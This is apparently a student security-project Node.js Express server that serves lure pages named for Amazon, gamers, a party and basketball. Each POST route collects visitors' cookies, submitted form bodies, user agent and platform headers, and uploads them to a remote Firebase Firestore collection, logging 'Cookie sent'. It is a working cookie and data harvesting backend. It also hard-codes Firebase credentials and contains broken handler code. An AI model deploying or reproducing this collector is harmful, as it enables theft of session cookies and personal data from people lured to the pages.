  const firebase = require("firebase");
  // Required for side-effects
  require("firebase/firestore");

const firebaseConfig = {
  apiKey: "AIzaSyBF2qjk9bdvX_QINMEJYiOY1Oxa1tr0Bjo",
  authDomain: "ec521project.firebaseapp.com",
  projectId: "ec521project",
  storageBucket: "ec521project.appspot.com",
  messagingSenderId: "217422249056",
  appId: "1:217422249056:web:dd518f57efa9fa82ac5705",
  measurementId: "G-0EE2YTP2C3"
};

const apps = firebase.initializeApp(firebaseConfig);
var db = firebase.firestore(apps);


const express = require("express");
const bodyParser = require('body-parser');
const app = express();
function makeData(req,res,source){
  var data = {};

  data["From_POST"] = req.body;
  data["HOST"] = req.headers.host;
  data["cookies"]=req.headers.cookie;
  data["platform"]=req.headers['sec-ch-ua-platform'];
  data["userA"] = req.headers['user-agent'];
  data["mobile"] = req.headers['sec-ch-ua-mobile'];
  data["browser"] = req.headers['sec-ch-uass'];
  // data["headers"] = req.headers;
  data["Src"] = source;
  //
  console.log(data);
  db.collection("clientID").add({client: JSON.stringify(data)});
  console.log("Cookie sent");
}
app.listen(3000, () => {
  console.log("Application started and Listening on port 3000");
});

app.use(express.static(__dirname));

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(bodyParser.raw());
//think this maybe incorrect paridime
app.get("/", (req, res) => {
  res.sendFile(__dirname + "/index.html");
  res.sendFile(__dirname + "/gotcha.html");
  res.sendFile(__dirname + "/game.html");
  res.sendFile(__dirname + "/BasketBall.html");
  res.sendFile(__dirname + "/source.js");

  
});

app.post('/basketBall', function (req, res) {
   makeData(req,res,"BBall");

});
app.post('/Amazon', function (req, res) {
   makeData(req,res,"Amazon");
});
app.post('/gamers', function (req, res) {
  makeData(req,res,"gamers");
});
app.post('/party', function (req, res) {
   makeData(req,res,"party");
});
// app.post('/formSubmit', function (req, res) {
app.post('/formSubmit', (req, res) => {
  res.sendFile(__dirname + "/index.html");
  res.sendFile(__dirname + "/gotcha.html");
  res.sendFile(__dirname + "/game.html");
  res.writeHead(302, {
      location: "localhost:3000"+__dirname + "/index.html",
    });
  res.end();
  var data = req.body
  console.log(data);
});


